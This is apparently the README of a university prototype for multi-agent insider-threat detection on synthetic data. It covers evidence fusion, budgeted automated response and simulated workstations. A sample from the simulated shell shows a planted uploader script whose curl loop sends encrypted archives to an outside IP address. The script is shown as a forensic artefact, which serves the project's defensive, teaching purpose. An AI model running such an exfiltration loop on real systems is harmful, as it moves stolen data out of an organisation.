<div align="center">

# Sentinel

**A multi-agent insider-threat detection and automated response system**

Specialised detection agents watch a university department, a fusion agent combines their
evidence with Dempster–Shafer theory, and a response agent contains what they find — within
an explicit disruption budget, and while watching its own sensors for signs of subversion.

CPE 310 · Group 4 · Department of Computer Science and Engineering, Obáfẹ́mi Awólọ́wọ̀ University, Ilé-Ifẹ̀

</div>

---

## What this is

Most intrusion-detection research stops at a verdict. This prototype closes the loop, and it
does one thing the state of the art does not: it treats **its own detection agents as part of
the attack surface**.

The system is built on the analysis of a base study — **Audit-LLM** (Song et al., 2024), the
strongest multi-agent insider-threat detector in the literature. Audit-LLM decomposes the
problem across cooperating language-model agents and reconciles them through informal debate.
That design has four weaknesses, and this system is a direct answer to each:

| Audit-LLM's weakness | What Sentinel does instead |
|---|---|
| Reconciles agents through informal LLM debate | **Dempster–Shafer evidence fusion** with per-entity reliability discounting and an explicit **conflict mass K** |
| Cannot tell when one of its own agents has been subverted | Detects **persistent minority dissent** and **self-reversal**, raises a conflict alarm, discounts the rogue agent, and preserves the honest consensus |
| Stops at detection — no response | A **constrained-MDP response agent** that acts in proportion to risk and holds the rate of disruptive action under an explicit **budget β** |
| LLM-bound: costly, slow, prompt-sensitive | Lightweight per-entity statistical detectors — the whole backend needs only **numpy** |

Everything runs on synthetic data for a simulated department of thirty people, so the
behaviour is reproducible and no real person's activity is involved.

---

## What you can do with it

**Watch the system work.** A live pipeline shows telemetry flowing from four detection agents
through fusion into the response agent, with per-agent heartbeats, an insider-risk gauge, a
conflict meter and the disruption-budget pressure — all updating in real time. The flow speed
is adjustable and the pipeline opens full-screen.

**Stage an attack, your way.** Pick any of the thirty staff members, choose a playbook —
*data exfiltration, credential abuse, lateral movement, sabotage, low-and-slow exfiltration* —
or compose your own from the individual activity kinds (`identity`, `file`, `network`, `host`,
`lateral`), set the intensity, and launch it. No two runs need look the same.

**Subvert an agent.** Any simulation can be run with one detection agent flipped to report
*benign* while its peers report malicious. Watch the conflict mass climb, the alarm fire, the
rogue agent's reliability collapse to 0.05 — and containment proceed anyway on the honest
three. This is the case the base study cannot handle.

**Investigate a case.** Every incident opens a full case file: the subject's identity, host,
IP, device and clearance; the timestamped event trace; the evidence each agent contributed;
every response action with its approval state and budget pressure; the risk and conflict
history; and the MITRE ATT&CK techniques observed.

**Open their workstation.** Each person has a simulated machine. Inspect its process table,
network connections, login sessions and disk — or drop into a **remote shell** and investigate
it with ordinary commands:

```
fyusuf@CSE-ICT-02:~$ ls -la ~/.cache/.sync
-rw-------  fyusuf  archive_001.tar.gz.enc   <-- flagged
-rw-------  fyusuf  archive_002.tar.gz.enc   <-- flagged
-rw-------  fyusuf  manifest.txt             <-- flagged

fyusuf@CSE-ICT-02:~$ cat ~/.cache/upload.sh
#!/bin/sh
# staged uploader
for f in $HOME/.cache/.sync/*.enc; do
  curl -s -T "$f" https://185.220.101.47/u/ >/dev/null 2>&1
  sleep 37
done
```

The forensic artefacts a machine grows depend on which activity kinds are running against it,
so what an analyst finds in the shell corroborates what the agents are reporting.

**Contain, or hold off.** Isolate a host from the network or pause its telemetry from the
dashboard, and watch the effect on the live stream — an isolated host moves to a restricted
VLAN, where the network agent still observes it but sees very little.

**Replay it.** Any playbook can be recorded and scrubbed through tick by tick.

---

## Architecture

```
  frontend/  Vite + React SPA  ──HTTP + SSE──▶  backend/  Python API
   Overview · Incidents · Entities                  │
   Agents · Simulate · Audit · Replay               ├─ mais/  the agent system
                                                    │    generator ─▶ detection agents
                                                    │    ─▶ Dempster–Shafer fusion
                                                    │    ─▶ constrained response
                                                    │    ─▶ explanation + provenance
                                                    ├─ shell.py / vfs.py  simulated machines
                                                    └─ SQLite  events + hash-chained audit
```

The backend uses **only the Python standard library plus numpy** — the HTTP server, the SSE
stream, SQLite persistence and the hash-chained audit log are all stdlib. No web framework, no
message broker, no ML runtime.

### How the fusion agent decides an agent has been subverted

Conflict alone is not proof. During a normal escalation the domains light up a tick apart, and
an agent that has not yet observed the attack is entitled to say so. An alarm therefore needs
**sustained conflict** *and* one of:

- **persistent minority dissent** — an agent that keeps contradicting a clear majority about
  the same person, tick after tick; or
- **self-reversal** — an agent that said *malicious* about someone and now insists *benign*,
  detected as a regime change across its own recent history for that subject.

Reliability is tracked **per agent per subject**, deliberately. An agent watching thirty people
is supposed to score most of them near zero and one of them near one; judged against a single
pooled history, a correct detection would look like a deviation and the honest agent would be
punished for doing its job.

---

## Running it

Requires **Python 3.9+** and **Node 18+**.

```bash
./dev.sh
```

That creates a virtual environment, installs numpy into it, starts the API on
`http://127.0.0.1:8000`, installs the frontend packages on first run, and starts Vite. Open the
URL Vite prints — usually **http://localhost:5173** — then go to **Simulate** and launch one.

### Or run the two halves by hand

```bash
# terminal 1 — backend
cd backend
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
python api.py

# terminal 2 — frontend
cd frontend
npm install
npm run dev
```

> **macOS note:** if `pip` reports *command not found*, that is because bare `pip` is not
> installed globally. Use the virtual environment above — inside it both `python` and `pip`
> work — or `python3 -m pip` outside it.

Point the frontend somewhere else with `frontend/.env`:

```
VITE_API=http://127.0.0.1:8000
```

### Verifying it without the UI

```bash
cd backend && python selftest.py
```

Checks the directory, that normal departmental traffic raises **no** false positives, that every
playbook is detected and contained, that a clean run raises **no** conflict alarm, that a
subverted agent **is** caught and containment still succeeds, that the analyst controls and the
remote shell work, and that the provenance chain verifies.

---

## Layout

| Path | What it is |
|---|---|
| `backend/mais/contracts.py` | the shared message types (Event, Score, Verdict, Action) |
| `backend/mais/entities.py` | the simulated department — thirty staff, six categories |
| `backend/mais/generator.py` | synthetic telemetry, playbooks and simulation kinds |
| `backend/mais/detectors.py` | per-entity behavioural detectors (numpy) |
| `backend/mais/agents/detection.py` | the detection agents, one per telemetry domain |
| `backend/mais/fusion.py` | reliability discounting, Dempster–Shafer, conflict mass, alarm |
| `backend/mais/scoring.py` | normalised insider-risk score and the risk ladder |
| `backend/mais/response.py` | constrained action selection and the disruption budget |
| `backend/mais/explain.py` | plain-language attribution and MITRE mapping |
| `backend/mais/incidents.py` | the case store — traces, evidence, actions |
| `backend/mais/vfs.py`, `shell.py` | the simulated workstations and their shell |
| `backend/mais/provenance.py` | the hash-chained audit log |
| `backend/api.py`, `db.py` | the JSON + SSE API and SQLite persistence |
| `frontend/src/pages/` | Overview, Incidents, Entities, Agents, Simulate, Audit, Replay |

---

## A note on scope

This is a prototype built to demonstrate an architecture, not a product. The data is
synthetic, the detectors are deliberately transparent statistical models rather than trained
deep networks, the message bus is in-process, and the enforcement actions are simulated. Those
are engineering-scale concerns; the design — cross-domain evidence fusion, Byzantine-aware
agent trust, bounded automated response, and end-to-end explainability — is the contribution.

The remote shell is a simulation over a virtual filesystem. It does not connect to any real
machine.

## Licence

MIT — see [LICENSE](LICENSE).

## Reference

Song, C. et al. (2024). *Audit-LLM: Multi-Agent Collaboration for Log-based Insider Threat
Detection.* The base study this work analyses and builds upon.
